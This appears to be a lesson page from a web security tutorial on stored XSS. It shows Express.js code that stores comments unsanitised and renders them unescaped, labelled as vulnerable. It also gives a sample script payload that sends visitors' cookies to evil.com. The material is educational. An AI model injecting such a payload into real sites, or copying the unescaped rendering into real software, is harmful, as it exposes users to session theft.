# 💾 Stored XSS

## The Malicious Script Lives on the Server

Per OWASP's own definition: "Stored attacks are those where the injected script is permanently
stored on the target servers, such as in a database, in a message forum, visitor log, comment
field, etc." Unlike [reflected XSS](reflected-xss.md), the payload doesn't need a specific victim to
click a crafted link — it's already sitting in the application's own data, waiting to be served to
*anyone* who views it.

## A Concrete Example

```js
// The comment is saved directly, exactly as submitted
app.post("/comments", async (req, res) => {
  await Comment.create({ text: req.body.text });   // no sanitization
  res.redirect("/post/" + req.body.postId);
});

// Later, rendered UNESCAPED for every visitor
app.get("/post/:id", async (req, res) => {
  const comments = await Comment.findAll({ where: { postId: req.params.id } });
  res.send(comments.map(c => `<div class="comment">${c.text}</div>`).join(""));  // VULNERABLE
});
```

```
An attacker submits a comment containing:
<script>fetch('https://evil.com/steal?c='+document.cookie)</script>

EVERY future visitor who views this post has that script
EXECUTE in their own browser, automatically, with NO action
required from them beyond simply viewing the page.
```

This is precisely what makes stored XSS genuinely more severe than reflected XSS: no phishing link,
no social engineering, no specific action required from any individual victim — simply *viewing* the
affected page is enough to be compromised.

## Why Stored XSS Can Compromise Far More Users

```
Reflected XSS: compromises ONE victim per successfully clicked
  malicious link

Stored XSS: compromises EVERY user who views the affected page,
  automatically, for as long as the malicious content remains
  stored - potentially THOUSANDS of users from ONE successful
  injection
```

This asymmetry is exactly why stored XSS is generally treated as the more critical variant of the
two — a single successful stored injection can silently compromise every visitor to a popular page,
with no further action required from the attacker after the initial injection.

## Where Stored XSS Commonly Hides

```
- Comment sections, forum posts, product reviews
- User profile fields (a "bio" or "display name")
- File names for uploaded content
- ANY user-generated content later rendered to OTHER users
```

The common thread: any field where one user's input is eventually shown to *other* users is a
genuine candidate for stored XSS — the risk exists specifically because the content crosses from
one user's browser into other users' browsers via the server's own storage and rendering.

## Common Mistakes

- Sanitizing input only at the point of *display* in some places, while other rendering paths for
  the same stored data remain unescaped.
- Assuming a field is "internal" or "low-risk" (an admin-only notes field, for instance) is exempt
  from this risk, when any eventual rendering to any browser at all creates the same exposure.
- Trusting client-side-only validation to prevent malicious content from ever reaching storage — an
  attacker can bypass the frontend entirely and submit directly to the API.

## ➡️ Next

Continue to [dom-based-xss.md](dom-based-xss.md) to see the third variant, which requires no
server involvement in the vulnerability at all.
